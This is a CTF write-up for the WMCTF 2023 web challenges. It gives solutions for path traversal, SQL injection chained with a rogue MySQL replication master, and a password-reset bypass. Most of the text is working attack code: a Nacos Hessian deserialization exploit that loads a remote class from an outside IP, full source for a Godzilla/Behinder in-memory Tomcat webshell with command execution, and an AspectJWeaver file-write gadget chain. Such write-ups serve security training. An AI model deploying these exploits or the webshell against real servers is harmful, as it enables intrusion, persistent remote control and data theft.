# WMCTF 2023_OFFICAL_WRITE-UP_CN

[TOC]

## WEB

### ez_java_again

Imagefile?url1=file:///%25%36%36%25%36%63%25%36%31%25%36%37%23java 

### AnyFileRead

/admin/..//..//..//..//..//..//..//flag

### ezblog

two tricks, one is db trick, the other is pm2 trick.

#### Intended solution

1. Attachement given TypeScript source code。

	The comment in TypeScript about `/post/:id/edit` is misleading，The parameter type of `getPostById(id: number) ` is number，but does not prevent the developer casting string as any as number，causing id actually be string，causing sql injection。The code to check if id is alnum is vulnerable，it only checks if id contains any digit。

2. According to the source code and dockerfile the server is running with pm2，and have a /console route，requires to auth by pin code in stdout（similar to Flask）。

	pm2 will save stdout and stderr into log files，by default the stdout log file is `~/.pm2/logs/main-out.log`。SQL injection `load_file()` to read the Debugger PIN。

	> dockerfile calls pm2 logs，so you can see the pm2 log file names directly by running the docker
	>
	> ```
	> docker-ezblogapp-1  | /home/ezblog/.pm2/logs/main-error.log last 15 lines:
	> docker-ezblogapp-1  | /home/ezblog/.pm2/logs/main-out.log last 15 lines:
	> docker-ezblogapp-1  | 0|main     |  * Serving Express app 'ezblog'
	> docker-ezblogapp-1  | 0|main     |  * Debug mode: on
	> docker-ezblogapp-1  | 0|main     |  * Running on http://0.0.0.0:3000/ (Press CTRL+C to quit)
	> docker-ezblogapp-1  | 0|main     |
	> docker-ezblogapp-1  | 0|main     |  * Debugger is active!
	> docker-ezblogapp-1  | 0|main     |  * Debugger PIN: e249afc4-5ecd-4ea8-a05a-ec8af975c92e
	> ```

3. /console can load any existing .ejs templates and execute any SQL statements excluding `into|outfile|dumpfile`。

	The intended solution is use `select 'exp' into outfile`  to write a new .ejs template and load it，use MySQL replication and binlog to execute the `select` statement，bypassing the filter of `into|outfile|dumpfile`。

	But binlog does not log `select` statements，And the MariaDB Service in challenge disabled `trigger、function、procedure` keywords by recompiling, these keywords can be used to store statements including `select into outfile` statement.

4. Make a rogue MySQL replication master server：

	On your own VPS，install MySQL，modify the config file to enable binlog，binlog format set to statement，binlog checksum set to none，allow replication（server id），create the replication user，start MySQL，run a long command，stop MySQL，modify the binlog file to replace “a long command ” with the `select into outfile` command，start MySQL。See exp_docker/exp.sh。

	If the replication host does not use binlog checksum, the replication slave will not verify it either.

	In MariaDB < 10.2.1 versions, binlog checksum is not enabled by default. (The MariaDB version on the challenge is MariaDB 10.9.8)

	However MySQL enables binlog checksum by default in all versions.

	https://mariadb.com/kb/en/replication-and-binary-log-system-variables/#binlog_checksum

	https://dev.mysql.com/doc/refman/8.0/en/replication-options-binary-log.html#option_mysqld_binlog-checksum

	The MariaDB recompiled missing keywords and the `mysql.*` tables does not impact its ability to become a replication slave.

	The exp uses MySQL from the docker image `dasctfbase/web_php73_apache_mysql`, the mysql version is MySQL 5.7.29, different MySQL versions should work as well.

	> 
	>
	> Modify the binlog file, easiest to do with sed command, replace any long enough SQL statement with a same length select statement. Make sure to disable binlog checksum.
	>
	> ```bash
	> #!/bin/bash -e
	> 
	> service mysql start
	> 
	> mysql -uroot -proot -e "CREATE USER 'admin'@'%' IDENTIFIED BY '123456';"
	> mysql -uroot -proot -e "GRANT REPLICATION SLAVE ON *.* TO 'admin'@'%';"
	> 
	> service mysql stop
	> 
	> echo 'server_id = 2' >> /etc/mysql/mysql.conf.d/mysqld.cnf
	> echo 'log-bin = mysql-bin' >> /etc/mysql/mysql.conf.d/mysqld.cnf
	> echo 'binlog_checksum = NONE' >> /etc/mysql/mysql.conf.d/mysqld.cnf
	> echo 'binlog_format = STATEMENT' >> /etc/mysql/mysql.conf.d/mysqld.cnf
	> echo 'master_verify_checksum = OFF' >> /etc/mysql/mysql.conf.d/mysqld.cnf
	> echo 'secure_file_priv = ' >> /etc/mysql/mysql.conf.d/mysqld.cnf
	> sed -i 's/bind-address\t= 127.0.0.1/bind-address = 0.0.0.0/g' /etc/mysql/mysql.conf.d/mysqld.cnf
	> rm /var/lib/mysql/auto.cnf
	> 
	> service mysql start
	> 
	> mysql -uroot -proot -e "CREATE DATABASE if not exists AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci"
	> 
	> service mysql stop
	> 
	> sed -i 's/CREATE DATABASE if not exists AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci/a SAME LENGTH select statement/g' /var/lib/mysql/mysql-bin.000001
	> 
	> service mysql start
	> ```
	>
	> 

5. Use `change master to ...`，`start slave`to start the replication slave，execute `select into outfile` from the binlog，and write a .ejs template file。

	load the template file to readflag。



#### Unintended solution - general_log to write existing file

Use general_log write exp to existing template file。

The general_log file and slow_query_log file，if created by MySQL，the permission will be 660，but writing to existing file will not modify its permission。（This is not consistent on different MySQL versions，in MySQL 5.7.29, the slow_query_log file permission is 666，general_log file permission is 640）

Writing general_log into /home/ezblog/views/post.ejs can be read by nodejs。

The MariaDB on the challenge is missing mysql.general_log table due to not executing `mysql_install_db`（because of the lack of keywords），you can create the table yourself。

```
create database mysql;
CREATE TABLE mysql.`general_log` (
  `event_time` timestamp(6) NOT NULL DEFAULT current_timestamp(6) ON UPDATE current_timestamp(6),
  `user_host` mediumtext NOT NULL,
  `thread_id` bigint(21) unsigned NOT NULL,
  `server_id` int(10) unsigned NOT NULL,
  `command_type` varchar(64) NOT NULL,
  `argument` mediumtext NOT NULL
) ENGINE=CSV DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci COMMENT='General log';
set global general_log=1;
set global general_log_file='/home/ezblog/views/post.ejs';
select 'exp';
```



#### Patched Unintended solution 1 - replicating trigger/function/procedure

Did you know that：trigger function procedure can store `select` statements。

Creating trigger or function or procedure on the replication master，use replication to get it onto the challenge，and call it。

This solution is not possible because of the removal of keywords, even if you use replication, it will still raise an error( you have an syntax error on "trigger...").

> In realword challenges，This solution is possible.

```
#Execute these commands on the replication master
#trigger
create database a;use a;
create table a(id int) engine='memory';
create trigger t before insert on a.a for each row select 1 into outfile '/tmp/trigger';
insert into a values(114);

#procedure
DELIMITER //
CREATE PROCEDURE exp()
BEGIN
SELECT 1 into outfile '/tmp/procedure';

END //

call exp();

#function
DELIMITER //
CREATE function exp()
RETURNS CHAR(50) DETERMINISTIC
BEGIN
SELECT 1 into outfile '/tmp/function';
return('2');

END //

select exp();
```

#### Patched Unintended solution 2 - Insert into mysql.proc

Inserting into mysql.proc can create stored procedure and stored function.

The filter of "INTO" can be bypassed with replication.

This solution is not possible because the removal of "FUNCTION" "CALL" keywords. (Stored procedures require CALL to call; Stored functions can be inserted but will raise an error when called)

![7007470588c14f997abfc0f071f70fd](https://cdn.ha1c9on.top/img/1692533210370-3045d075-6394-426b-8f68-7602f9a6cc40.png)

### 你的权限放着我来

The program will run and generate 4 accounts by default, one of which is the administrator account (jom@roomke.com). Reset the administrator account password to get the flag.

1. Register an account, log in successfully, guide the competition students to focus on other functions (forgot password reset); log in successfully right click to view the source code, you can get the list of user mailboxes, which contains the administrator mailbox.
2. Click the forgot password button, enter the password recovery page, fill in your email.
3. mailbox receive reset password link, access the link, enter the reset password, and packet capture, capture /api/change interface.
4. token set to empty, and change email to admin email, replay the request packet to get the flag.

### Traveler

Notice that the nacos version is 2.2.2

![image-20230801015141055](https://cdn.ha1c9on.top/img/image-20230801015141055.png)

This version of nacos is vulnerable to Hessian deserialization. Then in conjunction with the 2 attachments given, you can tell that there is actually a springboot service on the intranet. And then the flag is in the intranet service. So the first thing that needs to be done is to put a memory horse on nacos. Then since it's been more than a month, there are already tools for injecting memory horse threads. So here I magically altered the hessian source code and added some blacklists to prevent a handful of shagging by the tool. The POC is as follows

```java
package com.example.nacoshessianrce;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.fasterxml.jackson.databind.node.POJONode;
import com.google.protobuf.ByteString;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.naming.ResourceRef;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.naming.directory.DirContext;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Hashtable;
import java.util.concurrent.ConcurrentHashMap;

public class UrlClassLoaderExploit {
    public static void sendpayload(String address,byte[] payloads) throws Exception {
        Configuration conf = new Configuration();
        conf.parse(address);
        RouteTable.getInstance().updateConfiguration("naco", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 5000).isOk();
        PeerId leader = PeerId.parsePeer(address);
        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service_v2").setData(ByteString.copyFrom(payloads)).build();
        //final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("test_group").setData(ByteString.copyFrom(payloads)).build();
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
    }


    public static void main(String[] args) throws Exception {
        //URLCLASSLOADER RCE
        Reference refObj=new Reference("ControllerMemShell","GozillaMemShell","http://114.116.119.253:8889/");
        //Reference refObj=new Reference("evilref","evilref","http://114.116.119.253:8888/");
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();

        cpe.setResolvedObj(refObj);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        POJONode jsonNodes = new POJONode(ctx);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output oos = new Hessian2Output(baos);
        baos.write(79);
        oos.getSerializerFactory().setAllowNonSerializable(true);
        oos.writeObject(jsonNodes);
        oos.flushBuffer();
        byte[] bytespayload = baos.toByteArray();
        //sendpayload("127.0.0.1:7848",bytespayload);
        sendpayload("8.130.34.53:7848",bytespayload);
        //sendpayload("175.24.235.176:7848",bytespayload);
        //sendpayload("localhost:7848",bytespayload);
        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(baos.toByteArray()));
        //hessian2Input.readObject();

    }
    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
        //writeReplaceMethod.setAccessible(true);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    private static void Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}

```

One of the Godzilla memory horses is as follows

```java
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.tomcat.util.http.Parameters;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

public class GozillaMemShell {
    final String name="Boogipop";
    // 第一个构造函数
    String uri;
    String serverName="localhost";
    StandardContext standardContext;
    static {
        try {
            new GozillaMemShell();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    String xc = "3c6e0b8a9c15224a"; // key
    String pass = "pass";
    String md5 = md5(pass + xc);
    Class payload;
    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                // field不存在，错误不抛出，测试时可以抛出
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public GozillaMemShell() throws Exception {
        getStandardContext();
    }

    public void getStandardContext() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        return;
                    }
                }
                Object service = getField(getField(getField(
                        getField(getField(jioEndPoint, "handler"), "proto"),
                        "adapter"), "connector"), "service");
                Object engine = null;
                try {
                    engine = getField(service, "container");
                } catch (Exception e) {
                }
                if (engine == null) {
                    engine = getField(service, "engine");
                }

                children = (HashMap) getField(engine, "children");
                Object standardHost = children.get(this.serverName);

                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()) {
                    String contextKey = (String) iterator.next();
                    standardContext = (StandardContext) children.get(contextKey);
                    Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
                    Configs.setAccessible(true);
                    Map filterConfigs = (Map) Configs.get(standardContext);
                    if (filterConfigs.get(name) == null){
                        //开始添加Filter过滤器
                        Filter filter = new Filter() {
                            @Override
                            public void init(FilterConfig filterConfig) throws ServletException {

                            }

                            @Override
                            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                                HttpServletRequest request = (HttpServletRequest) servletRequest;
                                HttpServletResponse response = (HttpServletResponse) servletResponse;
                                //定义了恶意的FIlter过滤器，在dofilter方法执行恶意代码
                                try {
                                    // 入口
                                    if (request.getHeader("Referer").equalsIgnoreCase("https://www.boogipop.com/")) {
                                        Object lastRequest = request;
                                        Object lastResponse = response;
                                        // 解决包装类RequestWrapper的问题
                                        // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
                                        if (!(lastRequest instanceof RequestFacade)) {
                                            Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                                            lastRequest = getRequest.invoke(request);
                                            while (true) {
                                                if (lastRequest instanceof RequestFacade) break;
                                                lastRequest = getRequest.invoke(lastRequest);
                                            }
                                        }
                                        // 解决包装类ResponseWrapper的问题
                                        if (!(lastResponse instanceof ResponseFacade)) {
                                            Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                                            lastResponse = getResponse.invoke(response);
                                            while (true) {
                                                if (lastResponse instanceof ResponseFacade) break;
                                                lastResponse = getResponse.invoke(lastResponse);
                                            }
                                        }
                                        // cmdshell
                                        if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                                            String cmd = request.getHeader("cmd");
                                            if (cmd != null && !cmd.isEmpty()) {
                                                String[] cmds = null;
                                                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                                    cmds = new String[]{"cmd", "/c", cmd};
                                                } else {
                                                    cmds = new String[]{"/bin/bash", "-c", cmd};
                                                }
                                                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                                                ((ResponseFacade) lastResponse).getWriter().println(result);
                                            }
                                        } else if (request.getHeader("x-client-data").equalsIgnoreCase("rebeyond")) {
                                            if (request.getMethod().equals("POST")) {
                                                // 创建pageContext
                                                HashMap pageContext = new HashMap();

                                                // lastRequest的session是没有被包装的session!!
                                                HttpSession session = ((RequestFacade) lastRequest).getSession();
                                                pageContext.put("request", lastRequest);
                                                pageContext.put("response", lastResponse);
                                                pageContext.put("session", session);
                                                // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                                                String payload = request.getReader().readLine();
                                                if (payload == null || payload.isEmpty()) {
                                                    payload = "";
                                                    // 拿到真实的Request对象而非门面模式的RequestFacade
                                                    Field field = lastRequest.getClass().getDeclaredField("request");
                                                    field.setAccessible(true);
                                                    Request realRequest = (Request) field.get(lastRequest);
                                                    // 从coyoteRequest中拼接body参数
                                                    Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
                                                    coyoteRequestField.setAccessible(true);
                                                    org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
                                                    Parameters parameters = coyoteRequest.getParameters();
                                                    Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
                                                    paramHashValues.setAccessible(true);
                                                    LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);

                                                    Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
                                                    while (iterator.hasNext()) {
                                                        Map.Entry<String, ArrayList<String>> next = iterator.next();
                                                        String paramKey = next.getKey().replaceAll(" ", "+");
                                                        ArrayList<String> paramValueList = next.getValue();
                                                        if (paramValueList.size() == 0) {
                                                            payload = payload + paramKey;
                                                        } else {
                                                            payload = payload + paramKey + "=" + paramValueList.get(0);
                                                        }
                                                    }
                                                }

//                        System.out.println(payload);
                                                // 冰蝎逻辑
                                                String k = "e45e329feb5d925b"; // rebeyond
                                                session.putValue("u", k);
                                                Cipher c = Cipher.getInstance("AES");
                                                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                                                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                                                method.setAccessible(true);
                                                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                                                Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                                                evilclass.newInstance().equals(pageContext);
                                            }
                                        } else if (request.getHeader("x-client-data").equalsIgnoreCase("godzilla")) {
                                            // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                                            byte[] data = base64Decode(request.getParameter(pass));
                                            data = x(data, false);
                                            if (payload == null) {
                                                URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                                                Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                                                defMethod.setAccessible(true);
                                                payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                                            } else {
                                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                                Object f = payload.newInstance();
                                                f.equals(arrOut);
                                                f.equals(data);
                                                f.equals(request);
                                                response.getWriter().write(md5.substring(0, 16));
                                                f.toString();
                                                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                                                response.getWriter().write(md5.substring(16));
                                            }
                                        }
                                        return;
                                    }
                                } catch (Exception e) {
//            e.printStackTrace();
                                }
                                filterChain.doFilter(servletRequest, servletResponse);
                            }

                            @Override
                            public void destroy() {

                            }

                        };

                        FilterDef filterDef = new FilterDef();
                        filterDef.setFilter(filter);
                        filterDef.setFilterName(name);
                        filterDef.setFilterClass(filter.getClass().getName());
                        /**
                         * 将filterDef添加到filterDefs中
                         */
                        standardContext.addFilterDef(filterDef);

                        FilterMap filterMap = new FilterMap();
                        filterMap.addURLPattern("/*");
                        filterMap.setFilterName(name);
                        filterMap.setDispatcher(DispatcherType.REQUEST.name());

                        standardContext.addFilterMapBefore(filterMap);
                        /**
                         * 添加FilterMap
                         */
                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

                        filterConfigs.put(name,filterConfig);
                        /**
                         * 反射获取ApplicationFilterConfig对象，往filterConfigs中放入filterConfig
                         */
                        System.out.println("Inject Success !");
                    }
                    return;
                }
            }
        }
    }

    public static void main(String[] args) {

    }
}
```

We need to put the class file of the memory horse on the public http server and then run payload. instantiate the memory horse. Finally you can Godzilla on the horse.

![image-20230801015700340](https://cdn.ha1c9on.top/img/image-20230801015700340.png)

Check ifconfig

```
root@32ce0e0829d2:/tmp# ifconfig 
eth0      Link encap:Ethernet  HWaddr 02:42:ac:10:ee:0a  
          inet addr:172.16.238.10  Bcast:172.16.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:98773 errors:0 dropped:0 overruns:0 frame:0
          TX packets:118737 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:45285036 (45.2 MB)  TX bytes:38766178 (38.7 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:18413 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18413 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:5686911 (5.6 MB)  TX bytes:5686911 (5.6 MB)
```

You can see the intranet ip address. docker-compose.yml gets the intranet ip of the springboot service as 172.16.238.81:8686. then the source code of the springboot service is also given.

There are 2 routes:

![image-20230801020050691](https://cdn.ha1c9on.top/img/image-20230801020050691.png)

Here, direct command execution via readobject is not possible due to the presence of waf

```java
package com.wmctf.javamaster.utils;

import javax.swing.*;
import java.io.*;

public class WmObjectInputStream extends ObjectInputStream {
    private static int count=0;
    private static final String[] blacklist = new String[]{"java.security","javax.swing.AbstractAction","javax.management", "java.rmi","sun.rmi", "org.hibernate", "org.springframework", "com.mchange.v2.c3p0", "com.rometools.rome.feed.impl", "java.net.URL", "java.lang.reflect.Proxy", "javax.xml.transform.Templates", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "org.apache.xalan.xsltc.trax.TemplatesImpl", "org.python.core", "com.mysql.jdbc", "org.jboss","com.fasterxml.jackson","com.sun.jndi","com.alibaba.fastjson.JSONObject"};

    public WmObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected WmObjectInputStream() throws IOException, SecurityException {
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();
        String[] var3 = blacklist;
        int var4 = var3.length;
        for(int var5 = 0; var5 < var4; ++var5) {
            String forbiddenPackage = var3[var5];
            if (className.startsWith(forbiddenPackage)) {
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }
        }

        return super.resolveClass(desc);
    }
}
```

The `/` route clearly has Thymeleaf's template injection. But a file needs to be read and the content of that file is `WelCome To WMCTF2023`, consider AspectJWeaver utilizing a chain to write to an arbitrary file. Then trigger the SSTI final RCE

```java
package org.example;

import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class AspectJWeaver {

    public static void main(String[] args) throws Exception {

        byte[] content = Base64.decode("V2VsQ29tZSBUbyBXTUNURjIwMjM=");
        String path = "/tmp/secure.txt";

        Class aspectJWeaver = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor ctor = aspectJWeaver.getDeclaredConstructor(String.class, int.class);
        ctor.setAccessible(true);
        Object obj = ctor.newInstance("",2);

        Transformer transformer = new ConstantTransformer(content);

        Map lazyMap = LazyMap.decorate((Map)obj, transformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, path);

        HashMap hashMap = new HashMap();
        hashMap.put("foo", "a");

        Field field = HashMap.class.getDeclaredField("table");
        field.setAccessible(true);

        Object[] array = (Object[]) field.get(hashMap);
        int a = 0;
        for(int i=0;i<array.length;i++)
            if(array[i]!=null)
                a=i;
        Object node = array[a];
        Field keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, entry);
        System.out.println(serial(hashMap));
    }
    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
        //writeReplaceMethod.setAccessible(true);
        oos.writeObject(o);
        oos.close();

        String base64String = java.util.Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = java.util.Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    private static void Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = java.util.Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }

}
```

```
